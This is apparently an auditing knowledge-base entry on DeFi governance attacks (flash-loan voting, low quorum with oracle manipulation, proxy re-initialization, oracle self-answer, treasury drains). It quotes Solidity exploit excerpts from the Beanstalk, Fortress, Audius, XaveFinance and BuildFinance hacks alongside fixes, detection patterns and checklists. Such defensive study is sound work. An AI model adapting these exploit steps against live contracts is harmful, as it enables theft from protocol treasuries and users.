---
# Core Classification
protocol: "generic"
chain: "ethereum, bsc"
category: "governance"
vulnerability_type: "governance_manipulation"

# Pattern Identity (Required)
root_cause_family: missing_validation
pattern_key: governance_manipulation | governance_voting | logical_error | fund_loss

# Interaction Scope
interaction_scope: single_contract

# Attack Vector Details
attack_type: "logical_error"
affected_component: "governance_voting, proposal_execution, proxy_initialization"

# Technical Primitives
primitives:
  - "flash_loan_governance"
  - "emergency_commit"
  - "quorum_bypass"
  - "proxy_reinitialize"
  - "malicious_proposal"
  - "voting_power"
  - "oracle_manipulation"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.5
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "sweep"
  - "execute"
  - "propose"
  - "SafeSnap"
  - "castVote"
  - "Beanstalk"
  - "Reality.io"
  - "initialize"
  - "XaveFinance"
  - "getContract"
  - "initializer"
  - "BuildFinance"
  - "Initializable"
  - "emergencyCommit"
  - "queueTransaction"
path_keys:
  - "flash_loan_governance_takeover"
  - "low_quorum_governance_exploitation"
  - "proxy_re_initialization_attack"
  - "dao_module_oracle_self_answer_attack"
  - "governance_treasury_drain_via_token_acquisition"

# Context Tags
tags:
  - "defi"
  - "governance"
  - "dao"
  - "flash_loan"
  - "proposal"
  - "voting"
  - "proxy"
  - "initialization"
  - "quorum"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [BEAN-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-04/Beanstalk_exp.sol` |
| [FORT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-05/FortressLoans_exp.sol` |
| [AUD-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-07/Audius_exp.sol` |
| [XAVE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/XaveFinance_exp.sol` |
| [BUILD-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-02/BuildF_exp.sol` |

---

# Governance / DAO Manipulation Attack Patterns
## Overview

Governance manipulation attacks exploit weaknesses in on-chain governance systems to pass malicious proposals that drain protocol treasuries or modify critical parameters. The three primary attack vectors are: (1) flash-loaned voting power to achieve instant majority, (2) low quorum requirements that allow small token holdings to pass proposals, and (3) proxy re-initialization to overwrite governance parameters (voting period, quorum, guardian address). These attacks caused over **$81M** in losses in 2022, with Beanstalk Farms being the single largest governance exploit at $77M.

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_validation` |
| Pattern Key | `governance_manipulation | governance_voting | logical_error | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | ethereum, bsc |


## 1. Flash Loan Governance Takeover

> **pathShape**: `callback-reentrant`

### Root Cause

When governance voting power is determined by token balances at the time of vote (snapshot-less) or uses LP tokens that can be acquired via flash loans, an attacker can temporarily acquire majority voting power within a single transaction. If the governance allows same-transaction proposal execution (e.g., `emergencyCommit()`), the attacker can propose, vote, and execute a malicious proposal atomically — draining the entire protocol treasury before anyone can react.

### Attack Scenario

1. Pre-stage: submit a malicious proposal with an innocent-looking description
2. Wait for minimum proposal delay (e.g., 1 day for Beanstalk)
3. Take massive flash loans (stablecoins, ETH)
4. Convert flash-loaned assets into governance tokens / LP tokens
5. Deposit LP tokens into governance silo for voting power
6. Call `emergencyCommit()` — proposal passes instantly with flash-loaned majority
7. Malicious proposal executes: sweeps treasury to attacker
8. Unwind LP positions, repay flash loan

### Vulnerable Pattern Examples

**Example 1: Beanstalk Farms — Flash Loan Emergency Governance ($77M, April 2022)** [Approx Vulnerability: CRITICAL] `@audit` [BEAN-POC]

```solidity
// ❌ VULNERABLE: emergencyCommit allows same-tx proposal execution
// Voting power from flash-loaned Curve LP tokens deposited to Silo

// Pre-stage: Propose malicious BIP with attacker's sweep() callback
IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);
bytes memory data = abi.encodeWithSelector(ContractTest.sweep.selector);
beanstalkgov.propose(_diamondCut, address(this), data, 3);

// After 1-day waiting period, inside Aave flash loan callback:
// Step 1: Flash loan 350M DAI + 500M USDC + 150M USDT
// Step 2: Deposit all into Curve 3pool → 3CRV → BEAN3CRV LP
router.addLiquidity(amounts, 0);

// Step 3: Deposit LP into Beanstalk Silo → massive voting power
// @audit No snapshot — balance at time of vote counts
IBeanStalk(beanstalk).depositBeans(beanAmount);

// Step 4: emergencyCommit — executes proposal in same transaction!
// @audit Single-tx: propose (1 day ago) → deposit LP → vote → execute
beanstalkgov.emergencyCommit(bip);

// The malicious proposal callback:
function sweep() external {
    // @audit Drains entire Silo treasury to attacker
    IERC20 erc20bean3Crv = IERC20(BEAN3CRV_ADDRESS);
    erc20bean3Crv.transfer(msg.sender, erc20bean3Crv.balanceOf(address(this)));
}
```

---

## 2. Low Quorum Governance Exploitation

> **pathShape**: `atomic`

### Root Cause

When governance quorum requirements are set too low (or vote delegation concentrates power), an attacker with a relatively small token holding can pass proposals that modify critical protocol parameters. When combined with oracle manipulation, this enables a two-phase attack: first pass a proposal to add a worthless token as collateral, then manipulate its oracle price to borrow all protocol assets.

### Vulnerable Pattern Examples

**Example 2: Fortress Loans — Low Quorum + Oracle Manipulation ($3M, May 2022)** [Approx Vulnerability: CRITICAL] `@audit` [FORT-POC]

```solidity
// ❌ VULNERABLE: Low quorum allows malicious proposal to pass
// Combined with manipulable on-chain oracle (Chain.submit())

// Phase 1: Governance — propose adding FTS as 70% collateral factor
address[] memory _target = new address[](1);
_target[0] = Unitroller;
string[] memory _signature = new string[](1);
_signature[0] = "_setCollateralFactor(address,uint256)";
bytes[] memory _calldata = new bytes[](1);
_calldata[0] = abi.encode(fFTS, 700_000_000_000_000_000); // @audit 70% CF for FTS
IGovernorAlpha(GovernorAlpha).propose(
    _target, _value, _signature, _calldata,
    "Add the FTS token as collateral."  // Innocent-looking description
);

// Phase 2: After proposal passes (low quorum), manipulate oracle
// @audit Chain.submit() accepts signed oracle updates with weak validation
uint256[] memory _values = new uint256[](2);
_values[0] = 4e34;  // Set FTS-USD price to astronomical value
_values[1] = 4e34;  // Set MAHA-USD price to astronomical value
IChain(ChainContract).submit(
    uint32(block.timestamp), _root, _keys, _values, _v, _r, _s
);

// Phase 3: Deposit 100 worthless FTS tokens as "billions" of collateral
IFTS(FTS).approve(fFTS, type(uint256).max);
IfFTS(fFTS).mint(_FTS_balance);

// @audit Borrow ALL cash from every market
for (uint8 i; i < Delegators.length; i++) {
    uint256 borrowAmount = Delegators[i].getCash();
    Delegators[i].borrow(borrowAmount);  // Drain entire market
}
```

---

## 3. Proxy Re-Initialization Attack

> **pathShape**: `linear-multistep`

### Root Cause

When governance, staking, and delegate manager contracts are deployed behind proxies (UUPS or Transparent), the `initialize()` function must be called exactly once and then locked. If `initialize()` can be called again (missing `initializer` modifier, or the implementation was never properly initialized), an attacker can overwrite critical governance parameters — setting the voting period to 3 blocks, execution delay to 0, quorum to 1%, and themselves as guardian — enabling instant malicious proposal execution.

### Vulnerable Pattern Examples

**Example 3: Audius — Proxy Re-Initialization of Governance ($1.08M, July 2022)** [Approx Vulnerability: CRITICAL] `@audit` [AUD-POC]

```solidity
// ❌ VULNERABLE: governance proxy initialize() can be called again
// No initializer guard on the implementation contract

// Step 1: Re-initialize governance with attacker-controlled parameters
IGovernance(governance).initialize(
    address(this),  // @audit registryAddress → attacker contract
    3,              // @audit votingPeriod → 3 blocks (was much higher)
    0,              // @audit executionDelay → 0 (was time-locked)
    1,              // @audit votingQuorumPercent → 1% (was higher)
    4,              // maxInProgressProposals
    address(this)   // @audit guardianAddress → attacker is now guardian!
);

// Step 2: Re-initialize staking to give attacker massive voting power
IStaking(staking).initialize(address(this), address(this));
IDelegateManagerV2(delegatemanager).initialize(address(this), address(this), 1);
IDelegateManagerV2(delegatemanager).setServiceProviderFactoryAddress(address(this));
// @audit Fake 1e31 stake — attacker now has dominant voting power
IDelegateManagerV2(delegatemanager).delegateStake(address(this), 1e31);

// Step 3: Submit malicious proposal to transfer 99% of AUDIO tokens
uint256 stealAmount = AUDIO.balanceOf(governance) * 99 / 100;
IGovernance(governance).submitProposal(
    bytes32(uint256(3078)), 0,
    "transfer(address,uint256)",
    abi.encode(address(this), stealAmount),
    "Hello", "World"
);

// Step 4: Vote and execute in 3 blocks (near-instant)
// @audit votingPeriod was overwritten to 3 blocks
IGovernance(governance).submitVote(85, IGovernance.Vote(2)); // Yes vote
IGovernance(governance).evaluateProposalOutcome(85);          // Execute

// Attacker's callback interfaces:
function getContract(bytes32) external returns (address) { return AUDIO; }
function isGovernanceAddress() external view returns (bool) { return true; }
```

---

## 4. DAO Module Oracle Self-Answer Attack

> **pathShape**: `atomic`

### Root Cause

When a DAO uses Gnosis Safe Modules with Reality.io oracle for proposal validation, the security depends on the oracle bond economics. If the bond requirement is trivially low (1 wei) and anyone can submit answers, an attacker can propose malicious transactions and self-approve them by answering the Reality.io question themselves. After the challenge cooldown period (as low as 24 hours), the proposals execute unchallenged.

### Vulnerable Pattern Examples

**Example 4: XaveFinance — SafeSnap DAO Module + Reality.io Self-Answer (October 2022)** [Approx Vulnerability: CRITICAL] `@audit` [XAVE-POC]

```solidity
// ❌ VULNERABLE: SafeSnap DAO Module allows anyone to add proposals
// Reality.io oracle accepts 1 wei bond for answer submission

// Build 4 malicious transactions:
bytes32[] memory txIDs = new bytes32[](4);
txIDs[0] = DAO_MODULE.getTransactionHash(
    RNBW, 0,
    abi.encodeWithSignature("mint(address,uint256)", attacker, 100_000_000_000_000),
    Enum.Operation.Call, 0
);  // @audit Mint 100T RNBW tokens

txIDs[1] = DAO_MODULE.getTransactionHash(
    RNBW, 0,
    abi.encodeWithSignature("transferOwnership(address)", attacker),
    Enum.Operation.Call, 1
);  // @audit Take RNBW ownership

txIDs[2] = DAO_MODULE.getTransactionHash(
    LPOP, 0,
    abi.encodeWithSignature("transferOwnership(address)", attacker),
    Enum.Operation.Call, 2
);  // @audit Take LPOP ownership

txIDs[3] = DAO_MODULE.getTransactionHash(
    PrimaryBridge, 0,
    abi.encodeWithSignature("transferOwnership(address)", attacker),
    Enum.Operation.Call, 3
);  // @audit Take bridge ownership

// Submit proposal and self-approve with 1 wei bond
DAO_MODULE.addProposal("2", txIDs);
REALITIO.submitAnswer{value: 1}(questionID, bytes32(uint256(1)), 0);
// @audit 1 wei bond — no meaningful economic deterrent!

// Wait 24 hours cooldown...
// No one challenges → execute all 4 malicious transactions
DAO_MODULE.executeProposalWithIndex("2", txIDs, ...);
// Result: 100T tokens minted + ownership of 3 contracts stolen
```

---

## 5. Governance Treasury Drain via Token Acquisition

> **pathShape**: `linear-multistep`

### Root Cause

When governance token supply is small or concentrated, and the governance system has no minimum quorum percentage relative to total supply, an attacker can acquire enough tokens to single-handedly pass proposals. If the governance contract holds protocol tokens (treasury), the attacker proposes an `approve(attacker, MAX)` operation, votes it through, and drains the entire treasury.

### Vulnerable Pattern Examples

**Example 5: BuildFinance — Token Acquisition Governance Takeover (February 2022)** [Approx Vulnerability: CRITICAL] `@audit` [BUILD-POC]

```solidity
// ❌ VULNERABLE: No meaningful quorum — single holder can pass proposals
// Governance contract holds BUILD tokens as treasury

// Step 1: Acquire sufficient BUILD tokens
build.transfer(address(this), 101_529_401_443_281_484_977);
build.approve(address(BuildGovernance), type(uint256).max);

// Step 2: Propose: approve attacker to spend governance's BUILD
// @audit Malicious proposal: governance approves attacker for MAX spending
BuildGovernance.propose(
    BUILD_TOKEN, 0,
    abi.encodeWithSignature(
        "approve(address,uint256)", address(this), type(uint256).max
    )
);

// Step 3: Vote with acquired tokens — passes immediately
BuildGovernance.vote(8, true);  // @audit Single vote passes the proposal

// Step 4: Wait for timelock...
BuildGovernance.execute(
    8, BUILD_TOKEN, 0,
    abi.encodeWithSignature(
        "approve(address,uint256)", address(this), type(uint256).max
    )
);

// Step 5: Drain entire treasury
// @audit transferFrom using the governance's approval to attacker
build.transferFrom(
    address(BuildGovernance),
    address(this),
    build.balanceOf(address(BuildGovernance))
);
```

---

## Impact Analysis

### Technical Impact
- Complete treasury drainage via malicious proposal execution
- Governance parameter overwrite enabling instant, uncontested proposals
- Protocol borrowing capacity exploited via governance-added collateral + oracle manipulation
- Permanent loss of governance integrity — attacker can set themselves as guardian
- Cascading impact: all protocol assets drained across every lending market

### Business Impact
- **Total losses 2022:** $81M+ (Beanstalk $77M, Fortress $3M, Audius $1.08M, XaveFinance tokens+ownership, BuildFinance treasury)
- Beanstalk was the largest governance exploit in DeFi history at the time
- Destroys user trust in on-chain governance as a security model
- Demonstrates that flash-loan-based governance attacks are feasible even with time locks

### Affected Scenarios
- Governance systems without block-based snapshots (balance at vote time)
- `emergencyCommit()` or similar instant-execution mechanisms
- Low quorum requirements (< 10% of total supply)
- Proxy-based governance without properly locked `initialize()` functions
- Governance that accepts LP tokens or derivative tokens as voting power
- DAO modules with Reality.io oracles and trivial bond requirements
- Small-supply governance tokens enabling single-voter majority

---

## Secure Implementation

**Fix 1: Block-Based Snapshot Voting**
```solidity
// ✅ SECURE: Vote power determined by snapshot at proposal creation block
// Flash loans at voting time have zero effect

contract SecureGovernor {
    function propose(...) external returns (uint256 proposalId) {
        // Snapshot voting power at proposal creation block
        uint256 snapshotBlock = block.number;
        proposals[proposalId].snapshotBlock = snapshotBlock;
        // ...
    }
    
    function castVote(uint256 proposalId, uint8 support) external {
        uint256 snapshotBlock = proposals[proposalId].snapshotBlock;
        // Use historical balance — flash loans at current block don't count
        uint256 votingPower = token.getPastVotes(msg.sender, snapshotBlock);
        // ...
    }
}
```

**Fix 2: Timelock with Minimum Delay**
```solidity
// ✅ SECURE: Force minimum delay between proposal passing and execution
// Gives community time to react, exit, or veto

contract SecureTimelock {
    uint256 public constant MIN_DELAY = 2 days;
    uint256 public constant MAX_DELAY = 30 days;
    
    function queueTransaction(...) external onlyGovernor {
        uint256 eta = block.timestamp + delay;
        require(eta >= block.timestamp + MIN_DELAY, "Delay too short");
        require(eta <= block.timestamp + MAX_DELAY, "Delay too long");
        queuedTransactions[txHash] = true;
    }
    
    // NO emergencyCommit() — all proposals must go through timelock
}
```

**Fix 3: Initializer Guard for Proxy Contracts**
```solidity
// ✅ SECURE: Use OpenZeppelin initializer modifier — prevents re-initialization
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract SecureGovernance is Initializable {
    // initializer modifier ensures this runs exactly once
    function initialize(
        address _registry,
        uint256 _votingPeriod,
        uint256 _executionDelay,
        uint256 _quorum,
        address _guardian
    ) external initializer {
        require(_votingPeriod >= MIN_VOTING_PERIOD, "Voting period too short");
        require(_executionDelay >= MIN_EXECUTION_DELAY, "Delay too short");
        require(_quorum >= MIN_QUORUM, "Quorum too low");
        // ...
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- `emergencyCommit()` or instant proposal execution functions
- Governance voting without block-based snapshots (checkpoints)
- `initialize()` functions without `initializer` modifier on proxy implementations
- LP tokens or derivative tokens accepted as governance voting power
- Quorum below 10% of total supply or circulating tokens
- `propose()` → `execute()` possible within same transaction or few blocks
- Governance callback functions (Diamond cut, delegatecall execution)
- Missing minimum voting period, minimum execution delay constraints
```

### Audit Checklist
- [ ] Does governance use block-based snapshots for voting power?
- [ ] Can flash-loaned tokens influence voting outcomes?
- [ ] Is there a minimum timelock delay between passing and execution?
- [ ] Is `emergencyCommit()` or similar instant execution restricted?
- [ ] Is `initialize()` properly guarded with `initializer` modifier?
- [ ] Can proxy implementation be re-initialized?
- [ ] Is quorum requirement sufficient (>= 10% of supply)?
- [ ] Are governance parameter changes (quorum, delay, period) time-locked?
- [ ] Does `propose()` validate that the proposed actions are not treasury drains?

---

## Real-World Examples

### Known Exploits
- **Beanstalk Farms** — Flash loan governance takeover, Ethereum — April 2022 — $77M
  - Root cause: Flash-loaned Curve LP for voting power + emergencyCommit() same-tx execution
- **Fortress Loans** — Low quorum + oracle manipulation, BSC — May 2022 — $3M
  - Root cause: Insufficient quorum = malicious proposal passed + Chain.submit() oracle manipulation
- **Audius** — Proxy re-initialization of governance/staking, Ethereum — July 2022 — $1.08M
  - Root cause: Proxy `initialize()` callable again, rewrote voting period to 3 blocks + 1% quorum
- **XaveFinance** — SafeSnap DAO Module self-answer, Ethereum — October 2022 — 100T RNBW + ownership
  - Root cause: Reality.io oracle accepted 1 wei bond, anyone could propose and self-approve
- **BuildFinance** — Token acquisition treasury drain, Ethereum — February 2022 — BUILD treasury
  - Root cause: Small token supply, no quorum protection, attacker acquired majority + proposed approve()

---

## Prevention Guidelines

### Development Best Practices
1. Always use block-based snapshots (ERC20Votes/ERC20VotesComp) for governance voting
2. Enforce minimum timelock delay (>= 2 days) on all proposal executions
3. Remove any `emergencyCommit()` or instant execution mechanisms
4. Use OpenZeppelin `Initializable` with `initializer` modifier for all proxy contracts
5. Set minimum quorum to at least 10% of circulating supply
6. Exclude flash-loanable LP tokens from direct governance voting power
7. Implement veto/guardian mechanisms with separate time-locked authority

### Testing Requirements
- Unit tests for: flash loan during voting, re-initialization attempts, quorum edge cases
- Integration tests for: full proposal lifecycle with timelock, governance parameter changes
- Fuzzing targets: voting power calculation, quorum thresholds, proposal execution eligibility
- Scenario tests: attacker accumulates voting power via flash loan + votes in same block

---

## Keywords for Search

> `governance attack`, `flash loan governance`, `emergencyCommit`, `malicious proposal`, `voting power manipulation`, `quorum bypass`, `low quorum`, `proxy re-initialization`, `initialize vulnerability`, `governance takeover`, `treasury drain`, `Beanstalk`, `DAO exploit`, `voting snapshot`, `timelock bypass`, `proposal execution`, `delegateStake manipulation`, `guardian overwrite`, `on-chain governance`, `governance parameter overwrite`, `XaveFinance`, `SafeSnap`, `Reality.io`, `DAO module`, `BuildFinance`, `token acquisition`, `approve drain`

---

## Related Vulnerabilities

- `DB/general/initialization/defihacklabs-initialization-patterns.md` — Initialization vulnerabilities
- `DB/general/proxy-vulnerabilities/` — Proxy upgrade vulnerabilities
- `DB/oracle/price-manipulation/` — Oracle manipulation enabling governance+oracle combos
- `DB/general/flash-loan-attacks/` — Flash loan attack patterns
